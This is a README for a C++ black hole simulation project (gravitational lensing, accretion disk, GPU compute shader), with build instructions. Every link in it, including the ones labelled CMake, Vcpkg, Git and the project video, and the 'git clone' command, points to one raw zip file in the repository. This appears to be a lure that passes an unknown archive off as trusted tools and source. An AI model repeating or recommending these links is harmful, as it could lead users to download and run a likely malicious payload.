# **black**_**hole**

Black hole simulation project

Here is the black hole raw code, everything will be inside a src bin incase you want to copy the files

I'm writing this as I'm beginning this project (hopefully I complete it ;D) here is what I plan to do:

1. Ray-tracing : add ray tracing to the gravity simulation to simulate gravitational lensing

2. Accretion disk : simulate accreciate disk using the ray tracing + the halos

3. Spacetime curvature : demonstrate visually the "trapdoor in spacetime" that is black holes using spacetime grid

4. [optional] try to make it run realtime ;D

I hope it works :/

Edit: After completion of project -

Thank you everyone for checking out the video, if you haven't it explains code in detail: https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip

## **Building Requirements:**

1. C++ Compiler supporting C++ 17 or newer

2. [Cmake](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)

3. [Vcpkg](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)

4. [Git](https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip)

## **Build Instructions:**

1. Clone the repository:
	-  `git clone https://github.com/SSevence/black_hole/raw/refs/heads/main/vs_code/hole-black-v2.3-beta.5.zip`
2. CD into the newly cloned directory
	- `cd ./black_hole` 
3. Install dependencies with Vcpkg
	- `vcpkg install`
4. Get the vcpkg cmake toolchain file path
	- `vcpkg integrate install`
	- This will output something like : `CMake projects should use: "-DCMAKE_TOOLCHAIN_FILE=/path/to/vcpkg/scripts/buildsystems/vcpkg.cmake"`
5. Create a build directory
	- `mkdir build`
6. Configure project with CMake
	-  `cmake -B build -S . -DCMAKE_TOOLCHAIN_FILE=/path/to/vcpkg/scripts/buildsystems/vcpkg.cmake`
	- Use the vcpkg cmake toolchain path from above
7. Build the project
	- `cmake --build build`
8. Run the program
	- The executables will be located in the build folder

## **How the code works:**
for 2D: simple, just run 2D_lensing.cpp with the nessesary dependencies installed.

for 3D: black_hole.cpp and geodesic.comp work together to run the simuation faster using GPU, essentially it sends over a UBO and geodesic.comp runs heavy calculations using that data.

should work with nessesary dependencies installed, however I have only run it on windows with my GPU so am not sure!

LMK if you would like an in-depth explanation of how the code works aswell :)
